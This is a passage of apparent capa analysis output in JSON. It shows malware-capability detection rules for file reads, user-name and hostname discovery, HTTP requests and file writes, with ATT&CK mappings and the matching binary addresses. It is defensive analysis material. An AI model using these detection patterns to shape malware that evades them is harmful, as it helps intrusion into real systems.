                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442473077
                            },
                            {
                              "type": "absolute",
                              "value": 6442473030
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442621068
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442621271
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442621708
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442621936
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442622156
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442622362
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get session user name": {
        "meta": {
          "name": "get session user name",
          "namespace": "host-interaction/session",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Owner/User Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Owner/User Discovery",
              "subtechnique": "",
              "id": "T1033"
            },
            {
              "parts": [
                "Discovery",
                "Account Discovery"
              ],
              "tactic": "Discovery",
              "technique": "Account Discovery",
              "subtechnique": "",
              "id": "T1087"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 14-01.exe_:0x401285"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get session user name\r\n    namespace: host-interaction/session\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Discovery::System Owner/User Discovery [T1033]\r\n      - Discovery::Account Discovery [T1087]\r\n    examples:\r\n      - Practical Malware Analysis Lab 14-01.exe_:0x401285\r\n  features:\r\n    - or:\r\n      - api: advapi32.GetUserName\r\n      - api: secur32.GetUserNameEx\r\n      - basic block:\r\n        - and:\r\n          # - match: get session information (see #463)\r\n          - api: wtsapi32.WTSQuerySessionInformation\r\n          - number: 5 = WTSUserName\r\n      - call:\r\n        - and:\r\n          - api: wtsapi32.WTSQuerySessionInformation\r\n          - number: 5 = WTSUserName\r\n      - api: System.Security.Principal.WindowsIdentity::GetCurrent\r\n      - property/read: System.Environment::UserName\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442458992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459176
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserNameEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "get session user name/0727956844ee4b31b52fcd077f03e28c"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "get session user name/561ca517615c4f95bfc1fd497aefd800"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Security.Principal.WindowsIdentity::GetCurrent"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::UserName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442459776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459886
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserNameEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "get session user name/0727956844ee4b31b52fcd077f03e28c"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "match",
                      "match": "get session user name/561ca517615c4f95bfc1fd497aefd800"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Security.Principal.WindowsIdentity::GetCurrent"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::UserName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get hostname": {
        "meta": {
          "name": "get hostname",
          "namespace": "host-interaction/os/hostname",
          "authors": [
            "moritz.raabe@mandiant.com",
            "joakim@intezer.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "objective": "Discovery",
              "behavior": "System Information Discovery",
              "method": "",
              "id": "E1082"
            }
          ],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x4052A0",
            "7351f8a40c5450557b24622417fc478d:0x405438"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get hostname\r\n    namespace: host-interaction/os/hostname\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - joakim@intezer.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    mbc:\r\n      - Discovery::System Information Discovery [E1082]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4052A0\r\n      - 7351f8a40c5450557b24622417fc478d:0x405438\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetComputerName\r\n      - api: kernel32.GetComputerNameEx\r\n      - api: GetComputerObjectName\r\n      - api: ws2_32.gethostname\r\n      - api: gethostname\r\n      - property/read: System.Environment::MachineName\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442458992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459146
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerNameEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerObjectName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "gethostname"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::MachineName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442459776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459856
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerNameEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetComputerObjectName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "gethostname"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::MachineName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "prepare HTTP request": {
        "meta": {
          "name": "prepare HTTP request",
          "namespace": "communication/http/client",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "HTTP Communication",
                "Create Request"
              ],
              "objective": "Communication",
              "behavior": "HTTP Communication",
              "method": "Create Request",
              "id": "C0002.012"
            }
          ],
          "references": [],
          "examples": [
            "6A352C3E55E8AE5ED39DC1BE7FB964B1:0x10002650"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: prepare HTTP request\r\n    namespace: communication/http/client\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - Communication::HTTP Communication::Create Request [C0002.012]\r\n    examples:\r\n      - 6A352C3E55E8AE5ED39DC1BE7FB964B1:0x10002650\r\n  features:\r\n    - or:\r\n      - api: winhttp.WinHttpOpenRequest\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442458992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinHttpOpenRequest"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459258
                    }
                  ],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442459776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinHttpOpenRequest"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459973
                    }
                  ],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "write file on Windows": {
        "meta": {
          "name": "write file on Windows",
          "namespace": "host-interaction/file-system/write",
          "authors": [
            "william.ballenthin@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Writes File"
              ],
              "objective": "File System",
              "behavior": "Writes File",
              "method": "",
              "id": "C0052"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 01-04.exe_:0x4011FC",
            "563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x1400025C4"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: write file on Windows\r\n    namespace: host-interaction/file-system/write\r\n    authors:\r\n      - william.ballenthin@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - File System::Writes File [C0052]\r\n    examples:\r\n      - Practical Malware Analysis Lab 01-04.exe_:0x4011FC\r\n      # ntdll\r\n      - 563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x1400025C4\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - optional:\r\n          - basic block:\r\n            - or:\r\n              - number: 0x40000000 = GENERIC_WRITE\r\n              - number: 0x2 = FILE_WRITE_DATA\r\n              - match: create or open file\r\n          - call:\r\n            - or:\r\n              - number: 0x40000000 = GENERIC_WRITE\r\n              - number: 0x2 = FILE_WRITE_DATA\r\n              - match: create or open file\r\n        - or:\r\n          - api: kernel32.WriteFile\r\n          - api: kernel32.WriteFileEx\r\n          - api: NtWriteFile\r\n          - api: ZwWriteFile\r\n          - api: _fwrite\r\n          - api: fwrite\r\n      - api: System.IO.File::WriteAllBytes\r\n      - api: System.IO.File::WriteAllBytesAsync\r\n      - api: System.IO.File::WriteAllLines\r\n      - api: System.IO.File::WriteAllLinesAsync\r\n      - api: System.IO.File::WriteAllText\r\n      - api: System.IO.File::WriteAllTextAsync\r\n      - api: System.IO.File::AppendAllLines\r\n      - api: System.IO.File::AppendAllLinesAsync\r\n      - api: System.IO.File::AppendAllText\r\n      - api: System.IO.File::AppendAllTextAsync\r\n      - api: System.IO.File::AppendText\r\n      - api: System.IO.FileInfo::AppendText\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442459776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
